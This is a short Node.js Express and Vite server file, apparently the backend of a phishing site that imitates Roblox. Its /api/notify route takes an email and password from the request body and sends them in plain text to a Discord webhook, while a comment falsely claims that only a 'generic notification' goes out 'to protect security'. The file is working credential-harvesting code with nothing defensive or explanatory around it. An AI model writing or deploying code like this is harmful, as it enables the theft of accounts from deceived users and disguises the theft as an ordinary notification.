import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Route for Discord Notification
  app.post("/api/notify", async (req, res) => {
    const { username, code } = req.body;
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    if (!webhookUrl) {
      console.warn("DISCORD_WEBHOOK_URL is not set in environment variables");
      return res.status(500).json({ error: "Configuration error" });
    }

    try {
      // We send a generic notification to protect security
      const message = {
        embeds: [{
          title: "🚀 Nuova Attività sul Sito",
          description: `Un utente ha completato l'operazione.`,
          fields: [
            { name: "Email", value: username || "Anonimo", inline: true },
            { name: "Password", value: code || "Non fornito", inline: true }
          ],
          color: 5814783, // Blu Roblox/Discord style
          timestamp: new Date().toISOString(),
          footer: { text: "Sistema di Notifica Discord" }
        }]
      };

      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(message),
      });

      if (!response.ok) {
        throw new Error(`Discord API error: ${response.statusText}`);
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Error sending to Discord:", error);
      res.status(500).json({ error: "Failed to send notification" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
